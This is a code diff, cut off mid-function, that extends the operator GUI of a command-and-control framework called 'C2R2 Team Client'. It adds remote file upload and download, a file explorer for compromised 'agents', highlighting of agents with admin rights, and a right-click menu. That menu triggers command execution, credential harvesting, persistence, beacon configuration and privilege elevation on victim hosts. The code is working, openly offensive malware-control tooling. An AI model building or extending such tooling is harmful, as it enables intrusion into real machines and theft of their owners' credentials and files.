@@ -21,6 +21,7 @@ import queue
 import socket
 import threading
 import select
+import logging
 from datetime import datetime
 from pathlib import Path
 from typing import Optional, Dict, List, Any, Tuple
@@ -471,6 +472,52 @@ class C2R2ApiClient:
         except Exception as e:
             return False, str(e)
     
+    def upload_file(self, agent_id: int, local_path: str, remote_path: str) -> tuple[bool, str]:
+        """Upload a file to an agent."""
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            # Read and encode file
+            import base64
+            with open(local_path, 'rb') as f:
+                file_data = f.read()
+            data_base64 = base64.b64encode(file_data).decode('utf-8')
+            
+            response = requests.post(
+                f"{self.base_url}/api/agents/{agent_id}/upload",
+                headers=self._headers(),
+                json={"local_data_base64": data_base64, "remote_path": remote_path},
+                timeout=60
+            )
+            
+            data = response.json()
+            return data.get("success", False), data.get("message", "Unknown error")
+            
+        except FileNotFoundError:
+            return False, "Local file not found"
+        except Exception as e:
+            return False, str(e)
+    
+    def list_directory(self, agent_id: int, path: str) -> tuple[bool, str]:
+        """List directory contents on agent."""
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            response = requests.post(
+                f"{self.base_url}/api/agents/{agent_id}/listdir",
+                headers=self._headers(),
+                json={"path": path},
+                timeout=30
+            )
+            
+            data = response.json()
+            return data.get("success", False), data.get("message", "Unknown error")
+            
+        except Exception as e:
+            return False, str(e)
+    
     def harvest_credentials(self, agent_id: int) -> tuple[bool, str]:
         """Trigger credential harvesting on agent."""
         if not self.connected:
@@ -588,10 +635,24 @@ class C2R2TeamClient:
     """Main GUI application for C2R2 Team Client."""
     
     def __init__(self):
+        # Setup logging
+        self._setup_logging()
+        self.logger = logging.getLogger('C2R2TeamClient')
+        self.logger.info("="*60)
+        self.logger.info("C2R2 Team Client Starting")
+        self.logger.info("="*60)
+        
+        # Load configuration
+        self.config_file = Path.home() / ".c2r2" / "team_client_config.json"
+        self.config = self._load_config()
+        self.logger.debug(f"Config file: {self.config_file}")
+        
         self.root = tk.Tk()
         self.root.title("C2R2 Team Client")
         self.root.geometry("1200x800")
         self.root.minsize(800, 600)
+        
+        self.logger.debug("Tkinter window initialized")
         
         # Set icon if available
         try:
@@ -627,6 +688,8 @@ class C2R2TeamClient:
         self.selected_client = None
         self.agents: Dict[int, dict] = {}  # Dictionary to store connected agents
         self._agent_tree_items: Dict[int, str] = {}  # Mapping of agent_id to tree item
+        self.file_explorer_windows: Dict[int, tk.Toplevel] = {}  # File explorer windows
+        self.file_explorer_data: Dict[int, dict] = {}  # File explorer tree views and vars
         
         # Create UI
         self._setup_styles()
@@ -643,6 +706,49 @@ class C2R2TeamClient:
         
         # Handle window close
         self.root.protocol("WM_DELETE_WINDOW", self._on_close)
+    
+    def _setup_logging(self):
+        """Configure logging for debug output."""
+        # Create logs directory
+        log_dir = Path.home() / ".c2r2" / "logs"
+        log_dir.mkdir(parents=True, exist_ok=True)
+        
+        # Create log file with timestamp
+        log_file = log_dir / f"team_client_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
+        
+        # Configure logging
+        logging.basicConfig(
+            level=logging.DEBUG,
+            format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
+            handlers=[
+                logging.FileHandler(log_file, encoding='utf-8'),
+                logging.StreamHandler(sys.stdout)
+            ]
+        )
+        
+        print(f"[DEBUG] Logging to: {log_file}")
+    
+    def _load_config(self) -> dict:
+        """Load saved configuration."""
+        if self.config_file.exists():
+            try:
+                with open(self.config_file, 'r') as f:
+                    config = json.load(f)
+                    self.logger.info(f"Loaded configuration from {self.config_file}")
+                    return config
+            except Exception as e:
+                self.logger.error(f"Failed to load config: {e}")
+        return {}
+    
+    def _save_config(self):
+        """Save current configuration."""
+        try:
+            self.config_file.parent.mkdir(parents=True, exist_ok=True)
+            with open(self.config_file, 'w') as f:
+                json.dump(self.config, f, indent=2)
+            self.logger.info(f"Configuration saved to {self.config_file}")
+        except Exception as e:
+            self.logger.error(f"Failed to save config: {e}")
     
     def _setup_styles(self):
         """Configure ttk styles for dark theme."""
@@ -747,7 +853,9 @@ class C2R2TeamClient:
             row=row, column=0, sticky='e', padx=5, pady=5)
         self.ssh_host_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
         self.ssh_host_entry.grid(row=row, column=1, padx=5, pady=5)
-        self.ssh_host_entry.insert(0, "")
+        saved_ssh_host = self.config.get('ssh_host', '')
+        self.ssh_host_entry.insert(0, saved_ssh_host)
+        self.logger.debug(f"Loaded saved SSH host: {saved_ssh_host}")
         
         # SSH Port
         row += 1
@@ -755,7 +863,7 @@ class C2R2TeamClient:
             row=row, column=0, sticky='e', padx=5, pady=5)
         self.ssh_port_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
         self.ssh_port_entry.grid(row=row, column=1, padx=5, pady=5)
-        self.ssh_port_entry.insert(0, "22")
+        self.ssh_port_entry.insert(0, self.config.get('ssh_port', '22'))
         
         # SSH Username
         row += 1
@@ -763,7 +871,7 @@ class C2R2TeamClient:
             row=row, column=0, sticky='e', padx=5, pady=5)
         self.ssh_user_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
         self.ssh_user_entry.grid(row=row, column=1, padx=5, pady=5)
-        self.ssh_user_entry.insert(0, "")
+        self.ssh_user_entry.insert(0, self.config.get('ssh_user', ''))
         
         # SSH Password
         row += 1
@@ -780,6 +888,7 @@ class C2R2TeamClient:
         key_frame.grid(row=row, column=1, padx=5, pady=5, sticky='w')
         self.ssh_key_entry = ttk.Entry(key_frame, width=32, style='Dark.TEntry')
         self.ssh_key_entry.pack(side=tk.LEFT)
+        self.ssh_key_entry.insert(0, self.config.get('ssh_key', ''))
         browse_btn = tk.Button(key_frame, text="Browse", bg=self.colors['panel_bg'], 
                                fg=self.colors['fg'], relief=tk.FLAT,
                                command=self._browse_ssh_key)
@@ -796,7 +905,7 @@ class C2R2TeamClient:
             row=row, column=0, sticky='e', padx=5, pady=5)
         self.api_port_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
         self.api_port_entry.grid(row=row, column=1, padx=5, pady=5)
-        self.api_port_entry.insert(0, "5555")
+        self.api_port_entry.insert(0, self.config.get('api_port', '5555'))
         
         # Operator Username
         row += 1
@@ -804,7 +913,7 @@ class C2R2TeamClient:
             row=row, column=0, sticky='e', padx=5, pady=5)
         self.username_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
         self.username_entry.grid(row=row, column=1, padx=5, pady=5)
-        self.username_entry.insert(0, "operator")
+        self.username_entry.insert(0, self.config.get('username', 'operator'))
         
         # API Password
         row += 1
@@ -822,6 +931,22 @@ class C2R2TeamClient:
             font=('Consolas', 9)
         )
         hint_label.grid(row=row, column=1, sticky='w', padx=5)
+        
+        # Save credentials checkbox
+        row += 1
+        self.save_credentials_var = tk.BooleanVar(value=self.config.get('save_credentials', False))
+        save_check = tk.Checkbutton(
+            form_frame,
+            text="💾 Save connection information (credentials NOT stored)",
+            variable=self.save_credentials_var,
+            bg=self.colors['panel_bg'],
+            fg=self.colors['fg'],
+            selectcolor=self.colors['input_bg'],
+            activebackground=self.colors['panel_bg'],
+            activeforeground=self.colors['accent'],
+            font=('Consolas', 9)
+        )
+        save_check.grid(row=row, column=0, columnspan=2, pady=10)
         
         # Connect button
         row += 1
@@ -895,6 +1020,9 @@ class C2R2TeamClient:
         left_panel = ttk.Frame(main_paned, style='Panel.TFrame')
         main_paned.add(left_panel, weight=1)
         
+        # Store file explorer windows
+        self.file_explorer_windows: Dict[int, tk.Toplevel] = {}
+        
         # Agents header
         agents_header = ttk.Frame(left_panel, style='Panel.TFrame')
         agents_header.pack(fill=tk.X, padx=5, pady=5)
@@ -938,6 +1066,9 @@ class C2R2TeamClient:
         self.agents_tree.column('OS', width=150)
         self.agents_tree.column('Privileges', width=80)
         
+        # Configure tag for admin privileges (red and bold)
+        self.agents_tree.tag_configure('admin', foreground='#FF0000', font=('Consolas', 10, 'bold'))
+        
         scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.agents_tree.yview)
         self.agents_tree.configure(yscrollcommand=scrollbar.set)
         
@@ -946,6 +1077,29 @@ class C2R2TeamClient:
         
         self.agents_tree.bind('<<TreeviewSelect>>', self._on_agent_select)
         self.agents_tree.bind('<Double-1>', self._on_agent_double_click)
+        self.agents_tree.bind('<Button-3>', self._show_agent_context_menu)  # Right-click
+        
+        # Create context menu for agents
+        self.agent_context_menu = tk.Menu(self.root, tearoff=0, bg=self.colors['panel_bg'], 
+                                          fg=self.colors['fg'], activebackground=self.colors['accent'],
+                                          activeforeground='white')
+        self.agent_context_menu.add_command(label="📋 Select Agent", command=self._context_select_agent)
+        self.agent_context_menu.add_command(label="ℹ️ Show Info", command=self._context_show_info)
+        self.agent_context_menu.add_separator()
+        self.agent_context_menu.add_command(label="💻 Execute Command...", command=self._context_execute_command)
+        self.agent_context_menu.add_command(label="📂 File Explorer", command=self._context_file_explorer)
+        self.agent_context_menu.add_command(label="📥 Download File...", command=self._context_download_file)
+        self.agent_context_menu.add_command(label="📤 Upload File...", command=self._context_upload_file)
+        self.agent_context_menu.add_separator()
+        self.agent_context_menu.add_command(label="🔑 Harvest Credentials", command=self._context_harvest)
+        self.agent_context_menu.add_command(label="📌 Set Persistence...", command=self._context_persistence)
+        self.agent_context_menu.add_command(label="📡 Configure Beacon...", command=self._context_beacon)
+        self.agent_context_menu.add_command(label="⬆️ Elevate to Admin", command=self._context_elevate)
+        self.agent_context_menu.add_separator()
+        self.agent_context_menu.add_command(label="🔄 Refresh List", command=self._refresh_agents)
+        
+        # Variable to store the agent ID for context menu
+        self.context_menu_agent_id = None
         
         # Right panel - Console and commands
         right_panel = ttk.Frame(main_paned, style='Panel.TFrame')
@@ -1048,6 +1202,8 @@ class C2R2TeamClient:
     
     def _connect(self):
         """Handle connection via SSH tunnel to API server."""
+        self.logger.info("Connection attempt started")
+        
         # Get SSH connection details
         ssh_host = self.ssh_host_entry.get().strip()
         ssh_port = self.ssh_port_entry.get().strip()
@@ -1060,20 +1216,49 @@ class C2R2TeamClient:
         username = self.username_entry.get().strip()
         api_password = self.password_entry.get()
         
+        self.logger.debug(f"SSH Host: {ssh_host}")
+        self.logger.debug(f"SSH Port: {ssh_port}")
+        self.logger.debug(f"SSH User: {ssh_user}")
+        self.logger.debug(f"SSH Key: {'<set>' if ssh_key else '<none>'}")
+        self.logger.debug(f"SSH Password: {'<set>' if ssh_password else '<none>'}")
+        self.logger.debug(f"API Port: {api_port}")
+        self.logger.debug(f"Operator: {username}")
+        
+        # Save configuration if checkbox is checked
+        if self.save_credentials_var.get():
+            self.logger.info("Saving connection information...")
+            self.config = {
+                'save_credentials': True,
+                'ssh_host': ssh_host,
+                'ssh_port': ssh_port,
+                'ssh_user': ssh_user,
+                'ssh_key': ssh_key,
+                'api_port': api_port,
+                'username': username,
+                # Note: Passwords are NOT saved for security
+            }
+            self._save_config()
+        else:
+            self.logger.debug("Save credentials checkbox not checked")
+        
         # Validation
         if not ssh_host:
+            self.logger.warning("Connection failed: SSH Host is required")
             self.login_status.config(text="❌ SSH Host is required", foreground=self.colors['error'])
             return
         
         if not ssh_user:
+            self.logger.warning("Connection failed: SSH User is required")
             self.login_status.config(text="❌ SSH User is required", foreground=self.colors['error'])
             return
         
         if not ssh_password and not ssh_key:
+            self.logger.warning("Connection failed: SSH Password or Key is required")
             self.login_status.config(text="❌ SSH Password or Key is required", foreground=self.colors['error'])
             return
         
         if not api_password:
+            self.logger.warning("Connection failed: API Password is required")
             self.login_status.config(text="❌ API Password is required", foreground=self.colors['error'])
             return
         
@@ -1083,14 +1268,18 @@ class C2R2TeamClient:
         
         # Connect in a separate thread to avoid blocking UI
         def connect_thread():
+            self.logger.info("Connection thread started")
             try:
                 ssh_port_int = int(ssh_port)
                 api_port_int = int(api_port)
-            except ValueError:
+                self.logger.debug(f"Parsed ports - SSH: {ssh_port_int}, API: {api_port_int}")
+            except ValueError as e:
+                self.logger.error(f"Invalid port number: {e}")
                 self.root.after(0, lambda: self._on_connect_fail("Invalid port number"))
                 return
             
             # Step 1: Establish SSH tunnel
+            self.logger.info(f"Step 1: Establishing SSH tunnel to {ssh_host}:{ssh_port_int}")
             ssh_success, ssh_message, local_port = self.ssh_tunnel.connect(
                 host=ssh_host,
                 ssh_port=ssh_port_int,
@@ -1101,15 +1290,18 @@ class C2R2TeamClient:
             )
             
             if not ssh_success:
+                self.logger.error(f"SSH tunnel failed: {ssh_message}")
                 self.root.after(0, lambda: self._on_connect_fail(f"SSH: {ssh_message}"))
                 return
             
+            self.logger.info(f"SSH tunnel established: localhost:{local_port} -> {ssh_host}:{api_port_int}")
             self.root.after(0, lambda: self.login_status.config(
                 text="⏳ SSH tunnel established. Connecting to API...", 
                 foreground=self.colors['warning']
             ))
             
             # Step 2: Connect to API through the tunnel
+            self.logger.info(f"Step 2: Connecting to API at 127.0.0.1:{local_port}")
             api_success, api_message = self.api.connect(
                 host="127.0.0.1",
                 port=local_port,
@@ -1118,10 +1310,13 @@ class C2R2TeamClient:
             )
             
             if api_success:
+                self.logger.info("API connection successful")
                 # Start event listener
+                self.logger.debug("Starting WebSocket event listener")
                 self.api.start_event_listener(self._on_server_event)
                 self.root.after(0, lambda: self._on_connect_success(ssh_host, local_port, api_port_int))
             else:
+                self.logger.error(f"API connection failed: {api_message}")
                 # Disconnect SSH if API fails
                 self.ssh_tunnel.disconnect()
                 self.root.after(0, lambda: self._on_connect_fail(f"API: {api_message}"))
@@ -1150,7 +1345,10 @@ class C2R2TeamClient:
         event_type = event.get("type")
         data = event.get("data", {})
         
+        self.logger.debug(f"Received event: {event_type} - Data: {data}")
+        
         if event_type == "AgentConnected":
+            self.logger.info(f"Agent {data.get('id')} connected from {data.get('addr')}")
             self._update_agent(data)
             self._log_console(f"✅ Agent {data.get('id')} connected from {data.get('addr')}\n", 'success')
         
@@ -1166,8 +1364,15 @@ class C2R2TeamClient:
             agent_id = data.get("agent_id")
             output = data.get("output", "")
             is_error = data.get("is_error", False)
-            tag = 'error' if is_error else None
-            self._log_console(f"📨 [{agent_id}]: {output}\n", tag)
+            
+            # Check if this is a directory listing response
+            if output.startswith("__DIRLIST__:"):
+                # Parse and display in file explorer if open
+                self._handle_dirlist_output(agent_id, output)
+            else:
+                # Regular command output - log to console
+                tag = 'error' if is_error else None
+                self._log_console(f"📨 [{agent_id}]: {output}\n", tag)
         
         elif event_type == "FileDownloaded":
             self._log_console(
@@ -1197,6 +1402,56 @@ class C2R2TeamClient:
             message = data.get("message", "")
             tag = {'info': 'info', 'warning': 'warning', 'error': 'error'}.get(level, None)
             self._log_console(f"ℹ️ Server: {message}\n", tag)
+    
+    def _handle_dirlist_output(self, agent_id: int, output: str):
+        """Parse and display directory listing in file explorer."""
+        # Check if file explorer is open for this agent
+        if agent_id not in self.file_explorer_data:
+            return
+        
+        explorer_data = self.file_explorer_data[agent_id]
+        tree = explorer_data.get('tree')
+        status_var = explorer_data.get('status_var')
+        
+        if not tree or not status_var:
+            return
+        
+        try:
+            # Parse __DIRLIST__ output
+            # Format: __DIRLIST__:type|name|size\ntype|name|size\n...
+            content = output.replace("__DIRLIST__:", "").strip()
+            
+            # Clear existing items
+            for item in tree.get_children():
+                tree.delete(item)
+            
+            # Parse entries
+            lines = content.split('\n')
+            for line in lines:
+                line = line.strip()
+                if not line:
+                    continue
+                
+                parts = line.split('|')
+                if len(parts) != 3:
+                    continue
+                
+                type_char, name, size_str = parts
+                is_dir = (type_char == 'D')
+                
+                # Format display
+                file_type = "📁 Folder" if is_dir else "📄 File"
+                size_display = "" if is_dir else f"{int(size_str):,} bytes"
+                
+                # Insert into tree
+                tree.insert('', 'end', values=(name, file_type, size_display, ''))
+            
+            status_var.set(f"Loaded {len(lines)} items")
+            self.logger.info(f"File explorer updated for agent {agent_id}: {len(lines)} items")
+            
+        except Exception as e:
+            self.logger.error(f"Error parsing dirlist output: {e}")
+            status_var.set(f"Error parsing directory listing")
     
     def _on_connect_success(self, ssh_host: str, local_port: int, remote_api_port: int):
         """Handle successful connection."""
@@ -1277,24 +1532,32 @@ class C2R2TeamClient:
         if agent_id in self._agent_tree_items:
             item = self._agent_tree_items[agent_id]
             if self.agents_tree.exists(item):
+                privileges = agent_info.get('privileges', '...')
                 self.agents_tree.item(item, values=(
                     agent_id,
                     agent_info.get('hostname') or agent_info.get('addr', '...'),
                     agent_info.get('username', '...'),
                     agent_info.get('os_version', '...'),
-                    agent_info.get('privileges', '...')
+                    privileges
                 ))
+                # Apply admin tag if privileges are Admin
+                if privileges == 'Admin':
+                    self.agents_tree.item(item, tags=('admin',))
+                else:
+                    self.agents_tree.item(item, tags=())
                 self.agents[agent_id] = agent_info
                 return
         
         # Add new agent
+        privileges = agent_info.get('privileges', '...')
+        tags = ('admin',) if privileges == 'Admin' else ()
         item = self.agents_tree.insert('', tk.END, values=(
             agent_id,
             agent_info.get('hostname') or agent_info.get('addr', '...'),
             agent_info.get('username', '...'),
             agent_info.get('os_version', '...'),
-            agent_info.get('privileges', '...')
-        ))
+            privileges
+        ), tags=tags)
         self._agent_tree_items[agent_id] = item
         self.agents[agent_id] = agent_info
     
@@ -1424,6 +1687,17 @@ class C2R2TeamClient:
                 remote_path = ' '.join(parts[1:])
                 self._download_file(self.selected_client, remote_path)
         
+        elif command == '/upload' and len(parts) >= 3:
+            if self.selected_client is None:
+                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
+            else:
+                local_path = parts[1]
+                remote_path = ' '.join(parts[2:])
+                if not Path(local_path).exists():
+                    self._log_console(f"❌ Local file not found: {local_path}\n", 'error')
+                else:
+                    self._upload_file(self.selected_client, local_path, remote_path)
+        
         elif command == '/harvest':
             if self.selected_client is None:
                 self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
@@ -1460,9 +1734,14 @@ class C2R2TeamClient:
     
     def _execute_command(self, agent_id: int, command: str):
         """Execute a command on an agent."""
+        self.logger.info(f"Executing command on agent {agent_id}: {command}")
         def execute_thread():
             success, message = self.api.send_command(agent_id, command)
             tag = 'success' if success else 'error'
+            if success:
+                self.logger.debug(f"Command sent successfully to agent {agent_id}")
+            else:
+                self.logger.error(f"Failed to send command to agent {agent_id}: {message}")
             self.root.after(0, lambda: self._log_console(f"📤 [{agent_id}]: {message}\n", tag))
         
         threading.Thread(target=execute_thread, daemon=True).start()
@@ -1484,12 +1763,31 @@ class C2R2TeamClient:
     
     def _download_file(self, agent_id: int, remote_path: str):
         """Request file download from agent."""
+        self.logger.info(f"Downloading file from agent {agent_id}: {remote_path}")
         def download_thread():
             success, message = self.api.download_file(agent_id, remote_path)
             tag = 'success' if success else 'error'
+            if success:
+                self.logger.info(f"Download request sent for {remote_path}")
+            else:
+                self.logger.error(f"Download failed: {message}")
             self.root.after(0, lambda: self._log_console(f"📥 [{agent_id}]: {message}\n", tag))
         
         threading.Thread(target=download_thread, daemon=True).start()
+    
+    def _upload_file(self, agent_id: int, local_path: str, remote_path: str):
+        """Upload a file to an agent."""
+        self.logger.info(f"Uploading file to agent {agent_id}: {local_path} -> {remote_path}")
+        def upload_thread():
+            success, message = self.api.upload_file(agent_id, local_path, remote_path)
+            tag = 'success' if success else 'error'
+            if success:
+                self.logger.info(f"Upload request sent for {local_path}")
+            else:
+                self.logger.error(f"Upload failed: {message}")
+            self.root.after(0, lambda: self._log_console(f"📤 [{agent_id}]: {message}\n", tag))
+        
+        threading.Thread(target=upload_thread, daemon=True).start()
     
     def _harvest_credentials(self, agent_id: int):
         """Trigger credential harvesting."""
@@ -1578,6 +1876,7 @@ class C2R2TeamClient:
 
 📁 File Operations:
    /download <path>       - Download file from agent
+   /upload <local> <remote> - Upload file to agent
 
 🔧 Advanced Operations:
    /harvest               - Harvest credentials
@@ -1587,6 +1886,8 @@ class C2R2TeamClient:
 
 ℹ️ Other:
    /help                  - Show this help
+
+💡 TIP: Right-click on an agent for quick actions and File Explorer!
 """
         # Create a new window for help
         help_window = tk.Toplevel(self.root)
@@ -1605,11 +1906,530 @@ class C2R2TeamClient:
         text.insert(tk.END, help_text)
         text.config(state=tk.DISABLED)
     
+    def _show_agent_context_menu(self, event):
+        """Show context menu on right-click."""
+        # Select the item under cursor
+        item = self.agents_tree.identify_row(event.y)
+        if item:
+            self.agents_tree.selection_set(item)
+            values = self.agents_tree.item(item)['values']
+            self.context_menu_agent_id = int(values[0])
+            
+            # Show the menu at cursor position
+            try:
+                self.agent_context_menu.tk_popup(event.x_root, event.y_root)
+            finally:
+                self.agent_context_menu.grab_release()
+    
+    def _context_select_agent(self):
+        """Select agent from context menu."""
+        if self.context_menu_agent_id:
+            self.selected_client = self.context_menu_agent_id
+            self._update_prompt()
+            self._log_console(f"✅ Selected agent {self.context_menu_agent_id}\n", 'success')
+    
+    def _context_show_info(self):
+        """Show agent info from context menu."""
+        if self.context_menu_agent_id:
+            agent_info = self.agents.get(self.context_menu_agent_id, {})
+            self._log_console(f"\n📋 Agent [{self.context_menu_agent_id}] Info:\n", 'info')
+            self._log_console(f"   Address: {agent_info.get('addr', 'N/A')}\n")
+            self._log_console(f"   Hostname: {agent_info.get('hostname', 'N/A')}\n")
+            self._log_console(f"   Username: {agent_info.get('username', 'N/A')}\n")
+            self._log_console(f"   OS: {agent_info.get('os_version', 'N/A')}\n")
+            self._log_console(f"   Privileges: {agent_info.get('privileges', 'N/A')}\n")
+            self._log_console(f"   Connected: {agent_info.get('connected_at', 'N/A')}\n\n")
+    
+    def _context_execute_command(self):
+        """Execute command from context menu."""
+        if not self.context_menu_agent_id:
+            return
+        
+        # Create dialog for command input
+        dialog = tk.Toplevel(self.root)
+        dialog.title(f"Execute Command on Agent {self.context_menu_agent_id}")
+        dialog.geometry("500x150")
+        dialog.configure(bg=self.colors['bg'])
+        dialog.transient(self.root)
+        dialog.grab_set()
+        
+        ttk.Label(dialog, text="Enter command to execute:", style='Dark.TLabel').pack(pady=10)
+        
+        cmd_entry = tk.Entry(dialog, width=60, bg=self.colors['input_bg'], 
+                            fg=self.colors['fg'], font=('Consolas', 11))
+        cmd_entry.pack(pady=10, padx=20)
+        cmd_entry.focus()
+        
+        def execute():
+            command = cmd_entry.get().strip()
+            if command:
+                self._execute_command(self.context_menu_agent_id, command)
+                dialog.destroy()
+        
+        cmd_entry.bind('<Return>', lambda e: execute())
+        
+        btn_frame = tk.Frame(dialog, bg=self.colors['bg'])
+        btn_frame.pack(pady=10)
+        
+        tk.Button(btn_frame, text="Execute", bg=self.colors['accent'], fg='white',
+                 relief=tk.FLAT, command=execute, padx=20).pack(side=tk.LEFT, padx=5)
+        tk.Button(btn_frame, text="Cancel", bg=self.colors['panel_bg'], fg=self.colors['fg'],
+                 relief=tk.FLAT, command=dialog.destroy, padx=20).pack(side=tk.LEFT, padx=5)
+    
+    def _context_download_file(self):
+        """Download file from context menu."""
+        if not self.context_menu_agent_id:
+            return
+        
+        # Create dialog for file path input
+        dialog = tk.Toplevel(self.root)
+        dialog.title(f"Download File from Agent {self.context_menu_agent_id}")
+        dialog.geometry("500x150")
+        dialog.configure(bg=self.colors['bg'])
+        dialog.transient(self.root)
+        dialog.grab_set()
+        
+        ttk.Label(dialog, text="Enter remote file path:", style='Dark.TLabel').pack(pady=10)
+        
+        path_entry = tk.Entry(dialog, width=60, bg=self.colors['input_bg'], 
+                             fg=self.colors['fg'], font=('Consolas', 11))
+        path_entry.pack(pady=10, padx=20)
+        path_entry.insert(0, "C:\\")
+        path_entry.focus()
+        
+        def download():
+            path = path_entry.get().strip()
+            if path:
+                self._download_file(self.context_menu_agent_id, path)
+                dialog.destroy()
+        
+        path_entry.bind('<Return>', lambda e: download())
+        
+        btn_frame = tk.Frame(dialog, bg=self.colors['bg'])
+        btn_frame.pack(pady=10)
+        
+        tk.Button(btn_frame, text="Download", bg=self.colors['accent'], fg='white',
+                 relief=tk.FLAT, command=download, padx=20).pack(side=tk.LEFT, padx=5)
+        tk.Button(btn_frame, text="Cancel", bg=self.colors['panel_bg'], fg=self.colors['fg'],
+                 relief=tk.FLAT, command=dialog.destroy, padx=20).pack(side=tk.LEFT, padx=5)
+    
+    def _context_upload_file(self):
+        """Upload file from context menu."""
+        if not self.context_menu_agent_id:
+            return
+        
+        # Select local file
+        local_path = filedialog.askopenfilename(
+            title="Select File to Upload",
+            filetypes=[("All Files", "*.*")]
+        )
+        if not local_path:
+            return
+        
+        # Create dialog for remote path input
+        dialog = tk.Toplevel(self.root)
+        dialog.title(f"Upload File to Agent {self.context_menu_agent_id}")
+        dialog.geometry("500x180")
+        dialog.configure(bg=self.colors['bg'])
+        dialog.transient(self.root)
+        dialog.grab_set()
+        
+        ttk.Label(dialog, text=f"Local file: {Path(local_path).name}", 
+                 style='Dark.TLabel', font=('Consolas', 10)).pack(pady=10)
+        
+        ttk.Label(dialog, text="Enter remote path (destination):", style='Dark.TLabel').pack(pady=5)
+        
+        path_entry = tk.Entry(dialog, width=60, bg=self.colors['input_bg'], 
+                             fg=self.colors['fg'], font=('Consolas', 11))
+        path_entry.pack(pady=10, padx=20)
+        path_entry.insert(0, f"C:\\Users\\Public\\{Path(local_path).name}")
+        path_entry.focus()
+        path_entry.select_range(0, tk.END)
+        
+        def upload():
+            remote_path = path_entry.get().strip()
+            if remote_path:
+                self._upload_file(self.context_menu_agent_id, local_path, remote_path)
+                dialog.destroy()
+        
+        path_entry.bind('<Return>', lambda e: upload())
+        
+        btn_frame = tk.Frame(dialog, bg=self.colors['bg'])
+        btn_frame.pack(pady=10)
+        
+        tk.Button(btn_frame, text="Upload", bg=self.colors['accent'], fg='white',
+                 relief=tk.FLAT, command=upload, padx=20).pack(side=tk.LEFT, padx=5)
+        tk.Button(btn_frame, text="Cancel", bg=self.colors['panel_bg'], fg=self.colors['fg'],
+                 relief=tk.FLAT, command=dialog.destroy, padx=20).pack(side=tk.LEFT, padx=5)
+    
+    def _context_file_explorer(self):
+        """Open file explorer for agent."""
+        if not self.context_menu_agent_id:
+            return
+        
+        # Check if already open
+        if self.context_menu_agent_id in self.file_explorer_windows:
+            window = self.file_explorer_windows[self.context_menu_agent_id]
+            if window.winfo_exists():
+                window.lift()
+                return
+        
+        # Create file explorer window
+        explorer = tk.Toplevel(self.root)
+        explorer.title(f"File Explorer - Agent {self.context_menu_agent_id}")
+        explorer.geometry("900x600")
+        explorer.configure(bg=self.colors['bg'])
+        
+        self.file_explorer_windows[self.context_menu_agent_id] = explorer
+        
+        # Store references for WebSocket updates
+        self.file_explorer_data[self.context_menu_agent_id] = {
+            'tree': None,  # Will be set after tree creation
+            'path_var': None,
+            'status_var': None
+        }
+        
+        # Top bar with path navigation
+        nav_frame = tk.Frame(explorer, bg=self.colors['panel_bg'])
+        nav_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(nav_frame, text="Path:", style='Panel.TLabel').pack(side=tk.LEFT, padx=5)
+        
+        path_var = tk.StringVar(value="C:")
+        self.file_explorer_data[self.context_menu_agent_id]['path_var'] = path_var
+        path_entry = tk.Entry(nav_frame, textvariable=path_var, bg=self.colors['input_bg'],
+                             fg=self.colors['fg'], font=('Consolas', 10))
+        path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        
+        def browse_path():
+            path = path_var.get().strip()
+            if path:
+                load_directory(path)
+        
+        path_entry.bind('<Return>', lambda e: browse_path())
+        
+        tk.Button(nav_frame, text="Go", bg=self.colors['accent'], fg='white',
+                 relief=tk.FLAT, command=browse_path, padx=15).pack(side=tk.LEFT, padx=2)
+        
+        tk.Button(nav_frame, text="Up", bg=self.colors['info'], fg='white',
+                 relief=tk.FLAT, command=lambda: go_up(), padx=15).pack(side=tk.LEFT, padx=2)
+        
+        tk.Button(nav_frame, text="Refresh", bg=self.colors['success'], fg='white',
+                 relief=tk.FLAT, command=lambda: load_directory(path_var.get()), 
+                 padx=15).pack(side=tk.LEFT, padx=2)
+        
+        # Treeview for files
+        tree_frame = tk.Frame(explorer, bg=self.colors['panel_bg'])
+        tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        columns = ('Name', 'Type', 'Size', 'Modified')
+        file_tree = ttk.Treeview(tree_frame, columns=columns, show='headings',
+                                style='Dark.Treeview')
+        
+        file_tree.heading('Name', text='Name')
+        file_tree.heading('Type', text='Type')
+        file_tree.heading('Size', text='Size')
+        file_tree.heading('Modified', text='Modified')
+        
+        file_tree.column('Name', width=400)
+        file_tree.column('Type', width=100)
+        file_tree.column('Size', width=120)
+        file_tree.column('Modified', width=180)
+        
+        scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=file_tree.yview)
+        file_tree.configure(yscrollcommand=scrollbar.set)
+        
+        file_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+        
+        # Store tree reference for WebSocket updates
+        self.file_explorer_data[self.context_menu_agent_id]['tree'] = file_tree
+        
+        # Status bar
+        status_var = tk.StringVar(value="Ready")
+        self.file_explorer_data[self.context_menu_agent_id]['status_var'] = status_var
+        status_bar = ttk.Label(explorer, textvariable=status_var, style='Panel.TLabel',
+                              relief=tk.SUNKEN, anchor=tk.W)
+        status_bar.pack(fill=tk.X, padx=5, pady=2)
+        
+        # Context menu for file operations
+        file_context_menu = tk.Menu(explorer, tearoff=0, bg=self.colors['panel_bg'],
+                                   fg=self.colors['fg'], activebackground=self.colors['accent'],
+                                   activeforeground='white')
+        file_context_menu.add_command(label="📥 Download", 
+                                     command=lambda: download_selected())
+        file_context_menu.add_command(label="📤 Upload Here...",
+                                     command=lambda: upload_to_current())
+        file_context_menu.add_separator()
+        file_context_menu.add_command(label="🔄 Refresh", 
+                                     command=lambda: load_directory(path_var.get()))
+        
+        def show_file_context(event):
